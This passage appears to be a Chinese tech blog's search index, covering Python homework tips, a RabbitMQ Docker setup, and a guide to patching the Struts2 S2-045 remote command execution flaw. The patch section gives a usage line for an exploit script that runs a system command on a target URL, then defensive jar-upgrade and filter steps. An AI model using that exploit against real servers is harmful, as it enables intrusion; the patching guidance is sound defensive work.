print(\u2018\\n\u2019)\u662f\u4e0d\u884c\u7684","text":"<p>\u4e0a\u9762\u6211\u4eec\u90fd\u662f\u5728\u4e00\u884c\u91cc\u8f93\u51fa\uff0c\u73b0\u5728\u6211\u4eec\u8981\u5f00\u59cb\u4e0b\u4e00\u884c\u4e86\uff0c\u4f60\u5f88\u53ef\u80fd\u60f3<code>print('\\n')</code></p> <p>\u8fd9\u4e2a\u5b9e\u9645\u4e0a\u662f<code>print('\\n', end='\\n')</code> \u56e0\u4e3a\u4f60\u6ca1\u6709\u63d0\u4f9bend\u53c2\u6570\uff0cend\u5c31\u9ed8\u8ba4\u662f\u4e00\u4e2a\u6362\u884c\uff0c\u4f60\u81ea\u5df1\u53c8\u663e\u793a\u4e86\u4e2a\u6362\u884c\uff0c\u90a3\u5c31\u662f\u4e24\u4e2a\\n\u4e86\uff01</p> <p>\u4e24\u4e2a\\n\uff01\u5148\u8fdb\u5165\u4e0b\u4e00\u884c\uff0c\u518d\u8fdb\u5165\u4e0b\u4e00\u884c\uff0c\u4e0d\u5c31\u663e\u793a\u4e86\u4e00\u4e2a\u591a\u4f59\u7684\u7a7a\u884c\u4e86\u561b\uff01</p> <p>\u89e3\u51b3\u65b9\u6848\uff1a<code>print()</code>\u591a\u7b80\u5355</p>"},{"location":"PythonCourse/#_28","title":"\u5faa\u73af\u521d\u59cb\u5316 \u653e\u5728\u6b63\u786e\u7684\u4f4d\u7f6e","text":"<p>\u5faa\u73af\u4f9d\u8d56\u7684\u53d8\u91cf\u7684\u521d\u59cb\u5316\u2014\u2014\u4e00\u5b9a\u8981\u5728\u5faa\u73af\u5f00\u59cb\u4e4b\u524d\u505a\uff01\u4e0d\u80fd\u5728\u5916\u9762\u5faa\u73af\u4e4b\u524d\u505a\uff01</p> <pre><code>t=int(input())\ncnt=0\nlst=[] #\u50a8\u5b58\u7ed3\u679c\uff0c\u6700\u540e\u4e00\u8d77\u8f93\u51fa\nfor i in range(t):\nn=int(input())\nmat=[]\nfor j in range(n):\nmat.append(input().split())\nfor row in range(1,n):\nfor col in range(0,n-1):\nif row&gt;col and mat[row][col]=='0':\ncnt+=1\nif cnt==(n**2-n)/2:\nstr=\"YES\"\nelse:\nstr=\"NO\"\nlst.append(str)\nfor z in lst:\nprint(z)\n</code></pre> <p>\u4f8b\u5982\u8fd9\u4e2a\u5224\u65ad\u4e0a\u4e09\u89d2\u7684\uff0c\u5148\u770b\u8fd9\u4ee3\u7801\u7684\u672c\u8d28\u2014\u2014\u5faa\u73af\u91cc\u9762\u6709\u5faa\u73af\uff0c\u5916\u5c42\u5faa\u73af\uff08range t\uff09\u662f\u591a\u4e2a\u77e9\u9635\uff0c\u5185\u5c42\u5faa\u73af\uff08row\u548ccol\uff09\u7528\u6765\u904d\u5386\u77e9\u9635</p> <p>\u90a3\u95ee\u9898\u6765\u4e86\uff0c\u5185\u5c42\u5faa\u73af\u7684cnt\u4f5c\u7528\u5728\u5355\u4e2a\u77e9\u9635\u91cc\u9762\uff0c\u4e0d\u540c\u77e9\u9635\u4e4b\u95f4\u4e0d\u80fd\u76f8\u4e92\u5e72\u6270\uff0c\u4e5f\u5c31\u662f\u8bf4cnt\u5e94\u8be5\u5728\u8fdb\u5165row\u5faa\u73af\u4e4b\u524d\u521d\u59cb\u5316\uff01\u628acnt=0\u79fb\u52a8\u5230\u7b2c9\u884c\u4e4b\u524d\u5373\u53ef</p> <p>\u518d\u6253\u4e2a\u6bd4\u65b9\uff0c\u6211\u4eec\u8981\u8ba1\u7b97\u591a\u4e2a\u73ed\u7ea7\u5206\u522b\u7684\u5e73\u5747\u5206\uff0c\u9700\u8981\u5bf9\u73ed\u7ea7\u5185\u7684\u6bcf\u4e2a\u5b66\u751f\u7d2f\u52a0\u5230sum_score\uff0c\u90a3\u4f60\u5c31\u9700\u8981\u5728 \u8fdb\u5165\u8fd9\u4e2a\u73ed\u7ea7\u7684\u5faa\u73af\u540e \u5bf9\u73ed\u7ea7\u5185\u6bcf\u4e2a\u5b66\u751f\u904d\u5386\u7684\u5faa\u73af\u524d \u5bf9sum_score \u8fdb\u884c\u521d\u59cb\u5316 sum_score=0\uff1b\u5982\u679c\u4f60\u63d0\u65e9\u505a\u4e86\uff0c\u4e0a\u4e2a\u73ed\u7ea7\u7684\u603b\u5206\u5c31\u4f1a\u52a0\u5165\u5230\u4e0b\u4e2a\u73ed\u7ea7\uff0c\u4e0d\u5408\u9002\u5427</p> <pre><code>n=int(input())\ndata=[int(input()) for i in range(n)]\na=2\nfor i in data:\n    while a&lt;i:\n        if i%a==0:\n            print('No')\nbreak\na=a+1\nelse:\n        print('Yes')\n</code></pre> <p>\u8fd9\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5224\u65ad\u7d20\u6570\uff0c\u6bcf\u4e2a\u7d20\u6570\u7684\u5224\u65ad\u5e94\u8be5\u662f\u72ec\u7acb\u7684\uff0c\u9700\u8981\u628aa=2\u79fb\u52a8\u5230<code>for i in data:</code>\u5faa\u73af\u5f00\u59cb\u4e4b\u540e <code>while a&lt;i</code>\u5faa\u73af\u5f00\u59cb\u4e4b\u524d</p> <p>\u7b80\u800c\u8a00\u4e4b\uff1a\u54ea\u4e2a\u5faa\u73af\u8d1f\u8d23\u8fd9\u4e2a\u53d8\u91cf\uff0c\u5c31\u5728\u8fd9\u4e2a\u5faa\u73af\u4e4b\u524d\u505a\u521d\u59cb\u5316\uff0c\u4fdd\u8bc1\u5916\u5c42\u5faa\u73af\u4e92\u4e0d\u5e72\u6270</p>"},{"location":"PythonCourse/#_29","title":"\u586b\u7a7a\u9898\u522b\u51fa\u73b0\u4e2d\u6587\u5f15\u53f7","text":"<p>\u522b\u4ee5\u4e3a\u522b\u7684\u9898\u76ee\u6587\u672c\u91cc\u51fa\u73b0\u4e86\u4e2d\u6587\u5f15\u53f7\u4f60\u5c31\u80fd\u7528\uff0c\u9898\u76ee\u4e0d\u4e25\u8c28\u4e0d\u4ee3\u8868\u4f60\u80fd\u4e0d\u4e25\u8c28</p>"},{"location":"PythonCourse/#_30","title":"\u600e\u4e48\u6b63\u786e\u5730\u5224\u65ad\u7d20\u6570","text":"<p>\u5982\u679c\u4f60\u8fd8\u4e0d\u4f1a\uff0c\u5efa\u8bae\u80cc\u4e0b\u6765\u6807\u51c6\u7b54\u6848\uff1a\u53ea\u8981\u9047\u5230\u9700\u8981\u5224\u65ad\u7d20\u6570\u7684\u9898\u76ee\uff0c\u5148\u9ed8\u5199\u8fd9\u4e2aisPrime\u51fd\u6570</p> <p>\u8bb0\u5fc6\u53e3\u8bc0\uff1a1\u4e0d\u662f\uff0c2\u662f\uff0c\u4ece2\u5230(\u6839\u53f7n) + 1</p> <pre><code>import math\ndef isPrime(n):\n    if n==1:\n        return False\n    if n == 2:\n        return True\n    for i in range(2, int(math.sqrt(n)+1)):\n        if n%i==0:\n            return False\n    return True\n</code></pre> <p>\u4e0d\u8981\u628a\u7d20\u6570\u5224\u65ad\u7684\u4ee3\u7801\u548c\u5176\u4ed6\u4ee3\u7801\u6df7\u5728\u4e00\u8d77\uff0c\u6c42\u6c42\u4f60\u5199\u4e2a\u51fd\u6570\u5427\uff01 \u5199\u4e86\u51fd\u6570\u4e4b\u540e\u4f60\u53ef\u4ee5\u81ea\u5df1\u8c03\u7528\u51fd\u6570\u53bb\u6d4b\u8bd5\u554a\uff0c\u5982\u56fe\u6240\u793a\uff0c\u6211\u5199\u4e86\u4e4b\u540e\u5c31\u4f1a\u81ea\u5df1\u6784\u9020\u4e00\u4e9b\u6570\u636e\u53bb\u6d4b\u8bd5\u3002 \u6d4b\u8bd5  \u6d4b\u8bd5 \u6d4b\u8bd5</p> <pre><code>&gt;&gt;&gt; import math\n&gt;&gt;&gt; def isPrime(n):\n...     if n==1:\n...         return False\n...     if n == 2:\n...         return True\n...     for i in range(2, int(math.sqrt(n)+1)):\n...         if n%i==0:\n...             return False\n...     return True\n...\n&gt;&gt;&gt; isPrime(1)\nFalse\n&gt;&gt;&gt; isPrime(2)\nTrue\n&gt;&gt;&gt; isPrime(3)\nTrue\n&gt;&gt;&gt; isPrime(4)\nFalse\n&gt;&gt;&gt; isPrime(5)\nTrue\n&gt;&gt;&gt; isPrime(6)\nFalse\n&gt;&gt;&gt; isPrime(101)\nTrue\n&gt;&gt;&gt; isPrime(100)\nFalse\n</code></pre>"},{"location":"PythonCourse/#_31","title":"\u8fd0\u884c\u8d85\u65f6\u600e\u4e48\u7834\uff1f","text":""},{"location":"PythonCourse/#_32","title":"\u8bb0\u4f4f\u5224\u65ad\u7d20\u6570\u53ef\u4ee5\u5f00\u6839\u53f7\u554a\uff01","text":"<p>\u4e0d\u8981\u4ece2\u5230n-1\uff0c\u6839\u53f7n\u5c31\u884c\u4e86</p>"},{"location":"PythonCourse/#_33","title":"\u9898\u76ee\u7ed9\u7684\u4e0a\u754c\u4e00\u5b9a\u4f1a\u6709\u6d4b\u8bd5\u70b9","text":"<p>\u9a8c\u8bc1\u54e5\u5fb7\u5df4\u8d6b\u731c\u60f3\u4e00\u9898 </p> <p>\u9898\u76ee\u8bf4 \u8f93\u5165\u5728\u4e00\u884c\u4e2d\u7ed9\u51fa\u4e00\u4e2a(2, 2 000 000 000]\u8303\u56f4\u5185\u7684\u5076\u6570N\u3002</p> <p>\u54c7 \u597d\u591a0\uff0c\u6570\u4e00\u6570\u8fd9\u662f20\u4ebf\u554a\uff0c\u653e\u4e00\u4e2a\u8fd9\u4e48\u5927\u7684\u4e0a\u754c\u5728\u8fd9\u91cc\u5e72\u5565\u554a\uff1f\u53ea\u662f\u597d\u770b\u561b\uff1f</p> <p>\u80af\u5b9a\u662f\u6709\u4e00\u4e2a\u6d4b\u8bd5\u70b9\u4f1a\u8f93\u5165\u8fd9\u4e2a20\u4ebf\uff0c\u4f60\u81ea\u5df1\u672c\u5730\u6d4b\u8bd5\u4f60\u7684\u4ee3\u7801\u5c31\u4e00\u5b9a\u8981\u8bd5\u8bd5</p> <p>\u7136\u540e\u5c31\u53d1\u73b0\u4f60\u7684\u7a0b\u5e8f\u597d\u4e45\u6ca1\u53cd\u5e94\uff0c\u5c31\u5e94\u8be5\u4f18\u5316\u4e86</p>"},{"location":"PythonCourse/#_34","title":"\u60f3\u60f3\u600e\u4e48\u7b80\u5316\u8ba1\u7b97","text":"<p>\u8fd8\u662f\u54e5\u5fb7\u5df4\u8d6b\u731c\u60f3\u8fd9\u4e2a\u9898\u76ee\uff0c\u4f60\u89c9\u5f97\u9700\u8981\u6c42\u51fa\u5c0f\u4e8eN\u7684\u6240\u6709\u7d20\u6570\u561b\uff1f\u7136\u540e\u5728\u8fd9\u4e2a\u7d20\u6570\u6570\u7ec4\u91cc\u6c42\u6c42\u548c\uff1f</p> <p>\u5f53\u7136\u8fd9\u4e2a\u65b9\u6cd5\u6ca1\u9519\uff0c\u53ea\u662f\u592a\u6162\u4e86\uff0c\u8981\u6c42\u51fa20\u4ebf\u4ee5\u5185\u7684\u6240\u6709\u7d20\u6570\uff0c\u8fd9\u4e2a\u592a\u8d35\u4e86\uff08\u592a\u8017\u65f6\u4e86\uff0c\u65f6\u95f4\u5c31\u662f\u91d1\u94b1\u554a\uff09</p> <p>\u6211\u4eec\u7684\u76ee\u6807\u53ea\u662f\u7ed9\u51fa\u4e00\u4e2aN=p+q\u5c31\u884c\uff0c\u53ea\u8981\u4ece2\u5f00\u59cb\u627e\u7d20\u6570p\uff0c\u7136\u540e\u9a8c\u8bc1N-p\u4e5f\u662f\u7d20\u6570\u5373\u53ef</p>"},{"location":"PythonCourse/#python-homework-review","title":"Python Homework Review","text":"<p>PDF\u4e0b\u8f7d</p> <p>\u63d0\u7eb2\uff1a</p> <ul> <li>Python\u548cC\u8bed\u8a00\u4e0d\u540c\u7684\u5730\u65b9</li> <li>\u7a0b\u5e8f\u8f93\u51fa\u5565\uff1f\u628a\u81ea\u5df1\u5f53\u6210Python\u89e3\u91ca\u5668 \u5199\u8349\u7a3f</li> <li>\u5c40\u90e8\u53d8\u91cf \u51fd\u6570\u91cc\u88ab\u8d4b\u503c\u4e86\u7684\u5c31\u662f\u5c40\u90e8\u53d8\u91cf</li> <li>\u5bf9\u9f50 {0:T^20} \u7528T\u8865\u9f5020\u4f4d \u5c45\u4e2d</li> </ul> <p>\u7f16\u7a0b\u9898\u8003\u8bd5\u6280\u5de7\uff1a</p> <ul> <li>\u4e00\u6b65\u6b65\u5199\uff0c\u5199\u4e00\u70b9\u5c31\u4fa7\u4e00\u70b9</li> <li>\u5185\u7f6e\u51fd\u6570\u719f\u7ec3\u638c\u63e1 \u5982sum</li> <li>\u6ce8\u610f\u7a7a\u683c \u4e0d\u8981\u6d6a\u8d39\u65f6\u95f4\u5728\u683c\u5f0f\u9519\u8bef\u4e0a</li> <li>\u4ed4\u7ec6\u8bfb\u9898 \u4e00\u904d\u4e0d\u884c\u591a\u8bfb\u51e0\u904d</li> <li>\u770b\u770b\u4e0a\u754c\uff08\u4e00\u822c\u7528\u4e0d\u7740\uff09</li> <li>\u63d0\u53d6\u51fa\u51fd\u6570\uff0c\u964d\u4f4e\u601d\u7ef4\u8d1f\u62c5</li> <li>\u9012\u5f52\u51fd\u6570\u600e\u4e48\u5199\uff1f\u60f3\u6e05\u695a \u53c2\u6570 \u8fd4\u56de\u503c \u7684\u542b\u4e49</li> <li>\u5b9e\u5728\u641e\u4e0d\u5b9a\uff1f\u522b\u653e\u5f03\uff0c\u9a97\u5206\uff01</li> </ul> <p>\u9700\u8981\u8bb0\u4f4f\u70b9\u5565\uff1f</p> <ul> <li>\u7c7b\u578b\uff1ainput()\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u7528int, float\u8f6c\u6362\uff1b\u7528isinstance\u5224\u65ad\u7c7b\u578b\uff1b\u54ea\u4e9b\u662fFalse</li> <li>\u6570\u5b57\uff1a\u9664\u4ee50\u7684\u5f02\u5e38\uff0c\u8fdb\u5236\u8f6c\u6362\uff0c\u5224\u65ad\u7d20\u6570\uff0c\u683c\u5f0f\u5316\u8f93\u51fa\uff0c\u4f18\u5148\u7ea7</li> <li>\u5b57\u7b26\u4e32\uff1alen\uff0cupper\uff0clower\uff0cstrip\uff0csplit\uff0cjoin</li> <li>\u5217\u8868\uff1aappend\uff0cindex\uff0csorted(key=lambda i:-i)\uff0c\u6570\u7ec4\u7684\u6570\u7ec4\uff0c\u5206\u7247\uff0c<code>[::-1]</code>\uff0c\u5217\u8868\u63a8\u5bfc\u5f0f</li> <li>\u5b57\u5178\uff1akeys\uff0citems\uff0cupdate</li> <li>\u5faa\u73af\uff1arange\uff0cfor i in \u2026\uff0cwhile \u2026\uff0c\u53d8\u91cf\u521d\u59cb\u5316</li> <li>\u51fd\u6570\uff1a\u4f20\u9012\u4e00\u4e2a\u5217\u8868\uff1f\uff08\u5f15\u7528\u4f20\u9012\uff09\u5c40\u90e8\u53d8\u91cf\uff0c\u5168\u5c40\u53d8\u91cf</li> <li>tuple\uff1bset\uff1b\u6587\u4ef6\uff1b\u7c7b</li> </ul>"},{"location":"RabbitMQ/","title":"RabbitMQ \u6d88\u606f\u961f\u5217","text":""},{"location":"RabbitMQ/#docker","title":"Docker\u90e8\u7f72","text":"<ul> <li>\u5fc5\u987b\u8bbe\u7f6e\u4e3b\u673a\u540d \u2013hostname</li> <li>\u6570\u636e\u5377\u6620\u5c04</li> <li>\u4f7f\u7528macvlan\u5206\u914dIP</li> <li>\u914d\u7f6e\u7528\u6237\u5bc6\u7801</li> </ul> <p>\u914d\u7f6e\u7528\u6237\u5bc6\u7801\u5fc5\u987b\u8981\u6c42\u6570\u636e\u6587\u4ef6\u5939\u4e3a\u7a7a\uff0c\u5426\u5219\u4e0d\u4f1a\u751f\u6548</p> <pre><code>rm -rf /docker/rabbitmq/\n\ndocker run -d --hostname rabbit --name rmq -v /docker/rabbitmq/:/var/lib/rabbitmq --network macvlan_bridge --ip 192.168.1.18 --dns 192.168.1.1 -e RABBITMQ_DEFAULT_USER=user -e RABBITMQ_DEFAULT_PASS=password rabbitmq\n</code></pre>"},{"location":"RabbitMQ/#_1","title":"\u6d88\u8d39\u8005\u7ade\u4e89\u7684\u4efb\u52a1\u63a8\u9001\u6267\u884c","text":"<p>\u4f8b\u5982\u53d1\u9001\u53c2\u65701,2\u5230\u6d88\u8d39\u8005\u6267\u884c<code>add(a,b)</code>\u51fd\u6570\uff0c\u6bcf\u4e2a\u6d88\u8d39\u8005\u6700\u591a\u63a5\u53d7\u4e00\u4e2a\u4efb\u52a1</p>"},{"location":"RabbitMQ/#configpy","title":"config.py \u914d\u7f6e\u4fe1\u606f","text":"<p>\u4e0e\u4e0a\u8ff0docker\u542f\u52a8\u65f6\u914d\u7f6e\u7684\u4e00\u81f4</p> <pre><code>RMQ_HOST = \"192.168.1.18\"\nRMQ_PORT = 5672\nRMQ_USER = \"user\"\nRMQ_PASSWORD = \"password\"\n</code></pre>"},{"location":"RabbitMQ/#taskpy","title":"task.py \u53d1\u9001\u4efb\u52a1","text":"<pre><code>#!/usr/bin/env python\nimport pika\nimport sys\nimport json\nfrom config import RMQ_HOST,RMQ_PORT,RMQ_USER,RMQ_PASSWORD\nQUEUE_NAME = 'add_task_queue'\n\nparams = pika.ConnectionParameters(\n        host=RMQ_HOST, \n        port=RMQ_PORT, \n        credentials=pika.credentials.PlainCredentials(RMQ_USER, RMQ_PASSWORD)\n    )\nconnection = pika.BlockingConnection(params)\nchannel = connection.channel()\n\nchannel.queue_declare(queue=QUEUE_NAME, durable=True)\n\ndef queue_put(func_args): \n    #func_args:\u51fd\u6570\u53c2\u6570list\n    message = json.dumps(func_args)\n    return channel.basic_publish(exchange='',\n                          routing_key=QUEUE_NAME,\n                          body=message,\n                          properties=pika.BasicProperties(\n                             delivery_mode = 2, # make message persistent\n                          ))\n\nif __name__ == '__main__':\n    queue_put([1,2])\n    connection.close()\n</code></pre>"},{"location":"RabbitMQ/#_2","title":"\u67e5\u770b\u961f\u5217\u72b6\u6001","text":"<p>\u67e5\u770b\u961f\u5217\u540d\u79f0 \u51c6\u5907\u53d1\u9001\u7684\u6570\u91cf \u6ca1\u6709ack\u7684\u6570\u91cf</p> <pre><code>docker exec rmq rabbitmqctl list_queues name messages_ready messages_unacknowledged\n</code></pre>"},{"location":"RabbitMQ/#workerpy","title":"worker.py \u6267\u884c\u4efb\u52a1","text":"<pre><code>#!/usr/bin/env python\nimport pika\nimport time\nimport json\nfrom config import RMQ_HOST,RMQ_PORT,RMQ_USER,RMQ_PASSWORD\nQUEUE_NAME = 'add_task_queue'\n\nparams = pika.ConnectionParameters(\n        host=RMQ_HOST, \n        port=RMQ_PORT, \n        credentials=pika.credentials.PlainCredentials(RMQ_USER, RMQ_PASSWORD)\n    )\nconnection = pika.BlockingConnection(params)\nchannel = connection.channel()\n\nchannel.queue_declare(queue=QUEUE_NAME, durable=True)\nprint(' [*] Waiting for messages. To exit press CTRL+C')\n\ndef add(a, b):\n    return a+b\n\ndef save_result(args, result):\n    print(\"save_result for\", args, \":\", result)\n    pass # using mysql or whatever storage...\n\ndef callback(ch, method, properties, body):\n    print(\" [x] Received %r\" % body)\n    args = json.loads(body.decode())\n    result = add(*args)\n    save_result(args, result)\n    print(\" [x] Done\")\n    ch.basic_ack(delivery_tag = method.delivery_tag)\n\nchannel.basic_qos(prefetch_count=1)\nchannel.basic_consume(callback,\n                      queue=QUEUE_NAME)\n\nchannel.start_consuming()\n</code></pre> <p>\u4ee3\u7801\u6765\u81ea\u5b98\u65b9\u6559\u7a0b\uff1a https://www.rabbitmq.com/tutorials/tutorial-two-python.html</p>"},{"location":"S2-045/","title":"\u4fee\u590dStruts2\u7684S2-045\u6f0f\u6d1e","text":""},{"location":"S2-045/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u6700\u8fd1\u6279\u9732\uff0cApache Struts 2\u8f6f\u4ef6\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u9ad8\u5371\u6f0f\u6d1e\uff0cStruts2\u5b98\u65b9\u5df2\u7ecf\u786e\u8ba4\u8be5\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3aCVE-2017-5638\uff0c\u53d7\u5f71\u54cd\u7684\u7248\u672c\u5305\u62ec Struts2.3.5 \u5230 Struts2.3.31 \u4ee5\u53ca Struts2.5 \u5230 Struts2.5.10 \u3002\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u901a\u8fc7\u6d4f\u89c8\u5668\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5bf9\u53d7\u5f71\u54cd\u7ad9\u70b9\u9020\u6210\u4e25\u91cd\u5f71\u54cd\uff0c\u5f15\u53d1\u6570\u636e\u6cc4\u9732\u3001\u7f51\u9875\u7be1\u6539\u3001\u690d\u5165\u540e\u95e8\u3001\u6210\u4e3a\u8089\u9e21\u7b49\u5b89\u5168\u4e8b\u4ef6\u3002</p> <p>\u76ee\u524d\uff0cStruts 2\u8f6f\u4ef6\u4f5c\u4e3a\u7f51\u7ad9\u5f00\u53d1\u7684\u5e95\u5c42\u6a21\u677f\u4f7f\u7528\uff0c\u7279\u522b\u662f\u4e92\u52a8\u6027\u8f83\u5f3a\u7684\u7528\u4e8e\u62a5\u540d\u3001\u6ce8\u518c\u3001\u67e5\u8be2\u3001\u7559\u8a00\u7684\u4fe1\u606f\u7cfb\u7edf\uff0c\u6211\u56fd\u5185\u8d85\u8fc7300\u4e07\u5bb6\u653f\u5e9c\u7f51\u7ad9\u53ca\u5176\u5b50\u7ad9\u4f7f\u7528\u4e86Struts\u6846\u67b6\u3002\u9274\u4e8eStruts 2\u5e94\u7528\u5e7f\u6cdb\u3001\u9ed1\u5ba2\u5173\u6ce8\u5ea6\u8f83\u9ad8\u3001\u6f0f\u6d1e\u5371\u5bb3\u8f83\u5927\u3001\u653b\u51fb\u65b9\u5f0f\u7b80\u5355\uff0c\u4e00\u65e6\u88ab\u522b\u6709\u7528\u5fc3\u4eba\u5458\u5229\u7528\uff0c\u53ef\u80fd\u5bf9\u6211\u7f51\u7edc\u5b89\u5168\u9020\u6210\u8f83\u5927\u7684\u5371\u5bb3\u548c\u5f71\u54cd\uff0c\u5efa\u8bae\u5404\u91cd\u8981\u884c\u4e1a\u90e8\u95e8\u53ca\u65f6\u7763\u4fc3\u6838\u67e5\u672c\u90e8\u95e8\u3001\u672c\u884c\u4e1a\u3001\u672c\u8f96\u533a\u7f51\u7ad9\u5b89\u5168\u60c5\u51b5\uff0c\u53ca\u65f6\u5835\u585e\u6f0f\u6d1e\uff0c\u6d88\u9664\u5b89\u5168\u9690\u60a3\uff0c\u63d0\u9ad8\u5b89\u5168\u9632\u8303\u80fd\u529b\uff0c\u5e76\u53ca\u65f6\u4e0a\u62a5\u6838\u67e5\u53ca\u6574\u6539\u60c5\u51b5\u3002</p>"},{"location":"S2-045/#exp","title":"exp","text":"<p>\u9996\u5148\u4e22\u4e2aexp\uff0c\u7528\u4e8e\u68c0\u9a8c\u6f0f\u6d1e\u5b58\u5728\u6027\uff1aexp.S2-045.py</p> <p>\u4f7f\u7528\u65b9\u6cd5\u793a\u4f8b\uff1a</p> <pre><code>python exp.S2-045.py http://example.com/example.action \"id\"\n</code></pre>"},{"location":"S2-045/#_2","title":"\u89e3\u51b3\u8fc7\u7a0b","text":"<p>\u7ffb\u904d\u4e86\u5b98\u7f51\u548c\u5404\u79cd\u65b0\u95fb\uff0c\u6ca1\u6709\u5207\u5b9e\u53ef\u884c\u7684\u65b9\u6848\uff0c\u4e0b\u8f7d\u5730\u5740\u53ea\u6709\u5b58\u5728\u6f0f\u6d1e\u76842.3.31\u7684\u7248\u672c\uff0c\u6f0f\u6d1e\u4fee\u590d\u65b9\u6848\u90fd\u662f\u7b80\u7565\u7684\u4e00\u53e5\u5347\u7ea7\u52302.3.32\uff0c\u67d0\u4e9b\u64ad\u62a5\u5e73\u53f0&amp;\u5b98\u65b9\u771f\u662fmdzz\uff0c\u5230\u5e95\u662f\u4e3a\u4e86\u4fc3\u8fdb\u6f0f\u6d1e\u4fee\u8865\u8fd8\u662f\u4fc3\u8fdb\u5168\u7f51\u88ab\u9ed1\uff1f</p> <p>\u5b98\u65b9\u53ea\u662f\u7ed9\u4e86\u4e00\u4e2amaven\u7684\u914d\u7f6e\u65b9\u6cd5\uff0c\u5e76\u6ca1\u6709\u76f4\u63a5\u53ef\u4ee5\u4e0b\u8f7d\u7684jar\u6587\u4ef6\u6216zip\u5305</p> <p>\u53ea\u80fd\u6309\u7167\u5b98\u65b9\u7684\u65b9\u6cd5\u7528maven\u53bb\u5c1d\u8bd5\u6784\u5efa\u4e00\u4e2astruts\u5e94\u7528(\u5feb\u901f\u88c5\u597dmaven\u7684\u65b9\u6cd5\u662f\u4e70\u4e2a\u9999\u6e2f\u7684vps\u7528docker pull maven)\uff0c\u603b\u7b97\u53d1\u73b0\u4e86\u65b0\u7248\u7684jar\u5305\u4e0b\u8f7d\u5730\u5740\uff1a</p> <p>https://repo.maven.apache.org/maven2/org/apache/struts/</p> <p>\u901a\u8fc7\u4e0b\u8f7d2.3.31\u6838\u5fc3\u5305\u53d1\u73b0\u53ea\u6709<code>struts2-core</code>\u662f\u9700\u8981\u7684\u3002</p>"},{"location":"S2-045/#jar","title":"\u901a\u8fc7\u5347\u7ea7jar\u5305\u4fee\u590d","text":""},{"location":"S2-045/#23x","title":"2.3.x\u7248\u672c\u4fee\u590d\u65b9\u6cd5","text":"<p>\u4e0b\u8f7d2.3.32\u7248\u672c\u7684jar\u6587\u4ef6</p> <p>https://repo.maven.apache.org/maven2/org/apache/struts/struts2-core/2.3.32/struts2-core-2.3.32.jar</p> <p>\u56fd\u5185CDN\u4e0b\u8f7d\u5730\u5740: https://d.py3.io/struts2-core-2.3.32.jar</p> <p>\u5047\u8bbe\u670d\u52a1\u5668\u4e0a\u7528\u7684\u662f2.3.30\u7248\u672c\uff0c\u5219<code>tomcat\u6240\u5728\u76ee\u5f55/webapps/\u5e94\u7528\u540d\u79f0/WEB-INF/lib</code>\u91cc\u9762\u6709\u4e00\u4e2a<code>struts2-core-2.3.30.jar</code></p> <p>\u4fee\u590d\u65b9\u6cd5\u5c31\u662f\u2460\u628a\u4e0a\u8ff0\u6587\u4ef6\u5220\u6389(\u81ea\u884c\u5907\u4efd)\uff0c\u2461\u4e0b\u8f7d\u5230\u7684\u65b0\u7248jar\u6587\u4ef6\u6539\u540d\u4e3a\u540c\u540d\u6587\u4ef6\uff0c\u2462\u4e0a\u4f20\u66ff\u6362\uff0c\u2463\u91cd\u542ftomcat\u5373\u53ef</p> <p>Tip: \u66ff\u6362\u540e\u8981\u4fdd\u8bc1\u65e7\u7248\u7684jar\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u4f8b\u5982\u79fb\u5230\u4e0a\u4e00\u7ea7\u76ee\u5f55\uff0c\u4e0d\u8981\u628a\u65e7\u7248\u672c\u7684jar\u6539\u540d\u7559\u5728lib\u76ee\u5f55\u4e0b\uff0c\u5426\u5219\u5c06\u5bfc\u81f4\u8fd9\u4e2awebapp\u65e0\u6cd5\u542f\u52a8</p>"},{"location":"S2-045/#25x","title":"2.5.x\u7248\u672c\u4fee\u590d\u65b9\u6cd5","text":"<p>\u4e0b\u8f7d2.5.10.1\u7248\u672c\u7684jar\u6587\u4ef6</p> <p>https://repo.maven.apache.org/maven2/org/apache/struts/struts2-core/2.5.10.1/struts2-core-2.5.10.1.jar</p> <p>\u56fd\u5185CDN\u4e0b\u8f7d\u5730\u5740\uff1ahttps://d.py3.io/struts2-core-2.5.10.1.jar</p> <p>\u5047\u8bbe\u670d\u52a1\u5668\u4e0a\u7528\u7684\u662f2.5.10\u7248\u672c\uff0c\u5219<code>tomcat\u6240\u5728\u76ee\u5f55/webapps/\u5e94\u7528\u540d\u79f0/WEB-INF/lib</code>\u91cc\u9762\u6709\u4e00\u4e2a<code>struts2-core-2.5.10.jar</code></p> <p>\u4fee\u590d\u65b9\u6cd5\u540c\u4e0a</p>"},{"location":"S2-045/#filter","title":"\u901a\u8fc7\u589e\u52a0Filter\u4fee\u590d","text":"<p>\u5982\u679c\u4e0d\u65b9\u4fbf\u66ff\u6362jar\u5305\uff0c\u53ef\u4ee5\u901a\u8fc7\u672c\u65b9\u6cd5\u8fdb\u884c\u62e6\u622a\u653b\u51fb\u8bf7\u6c42</p> <p>\u2460 \u5c06\u4ee5\u4e0bSecurityFilter.java\u6587\u4ef6\u7f16\u8bd1\u6210SecurityFilter.class\uff0c\u6ce8\u610f\u7f16\u8bd1\u4e4b\u524d\u8bbe\u7f6e\u9879\u76ee\u7684\u517c\u5bb9\u6027\u7ea7\u522b\uff0c\u9009\u62e9\u670d\u52a1\u5668\u7248\u672c\u7684jdk\uff0c\u590d\u5236\u5230\u5e94\u7528\u7684WEB-INF/classes\u76ee\u5f55\u4e0b\u3002</p> <pre><code>import java.io.IOException;\nimport javax.servlet.Filter;\nimport javax.servlet.FilterChain;\nimport javax.servlet.FilterConfig;\nimport javax.servlet.ServletException;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n\npublic class SecurityFilter extends HttpServlet implements Filter {\n\nprivate static final long serialVersionUID = 1L;\n\n\npublic final String www_url_encode= \"application/x-www-form-urlencoded\";\npublic final String mul_data= \"multipart/form-data\";\npublic final String txt_pla= \"text/plain\";\n\npublic void doFilter(ServletRequest 